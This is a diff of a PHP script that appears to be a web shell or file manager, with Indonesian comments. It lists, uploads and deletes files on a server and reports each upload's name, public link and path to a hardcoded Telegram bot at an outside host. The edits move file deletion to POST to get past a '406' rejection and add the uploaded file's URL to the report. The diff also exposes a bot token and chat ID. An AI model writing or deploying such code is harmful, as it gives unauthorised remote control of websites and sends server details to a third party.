@@ -8,11 +8,12 @@ $token = "8687462257:AAEzX81PQXglaSAcKi2pz1zg01Kb-XXBOQ4";
 $chat_id = "8259867883";
 
 function sendTele($msg, $token, $chat_id) {
-    static $sent = [];
 
-    // anti spam (jangan kirim pesan sama berulang)
-    if (in_array($msg, $sent)) return;
-    $sent[] = $msg;
+    static $lastMsg = '';
+
+    // anti spam (jangan kirim pesan sama berturut-turut)
+    if ($msg === $lastMsg) return;
+    $lastMsg = $msg;
 
     $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
 
@@ -67,10 +68,10 @@ $current = !empty($_SESSION['history'])
     ? end($_SESSION['history'])
     : $base;
 
-// ================= DELETE =================
-if (isset($_GET['delete'])) {
+// ================= DELETE (FIX 406) =================
+if (isset($_POST['delete'])) {
 
-    $file = realpath($_GET['delete']);
+    $file = realpath($_POST['delete']);
 
     if ($file && strpos($file, $base) === 0 && is_file($file)) {
 
@@ -102,8 +103,12 @@ if (isset($_FILES['f'])) {
 
         echo "<p>✅ Upload sukses</p>";
 
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+        $fileUrl  = $protocol . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $target);
+
         $msg = "📤 FILE UPLOAD\n";
         $msg .= "Nama: $name\n";
+        $msg .= "Link: $fileUrl\n";
         $msg .= "Lokasi: $target";
 
         sendTele($msg, $token, $chat_id);
@@ -138,7 +143,13 @@ foreach (scandir($current) as $f) {
         echo "📁 <a href='?dir=".urlencode($full)."'>$f</a><br>";
     } else {
         echo "📄 <a href='?file=".urlencode($full)."'>$f</a> 
-        <a href='?delete=".urlencode($full)."' onclick=\"return confirm('Hapus file ini?')\">❌</a><br>";
+        
+        <form method='post' style='display:inline;'>
+            <input type='hidden' name='delete' value='".htmlspecialchars($full)."'>
+            <button onclick=\"return confirm('Hapus file ini?')\">❌</button>
+        </form>
+        
+        <br>";
     }
 }
 echo "</ul>";
